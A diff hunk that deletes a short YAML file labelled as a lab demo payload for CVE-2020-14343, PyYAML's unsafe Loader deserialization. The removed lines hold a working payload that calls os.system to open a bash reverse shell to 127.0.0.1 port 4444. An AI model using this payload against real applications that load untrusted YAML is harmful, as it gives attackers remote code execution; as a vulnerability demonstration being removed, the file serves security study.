@@ -1,5 +1,0 @@
-# CVE-2020-14343 demo payload — PyYAML unsafe Loader deserialization
-# This YAML will execute a reverse shell when loaded with yaml.Loader.
-# Lab demo use only.
-!!python/object/apply:os.system
-- "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
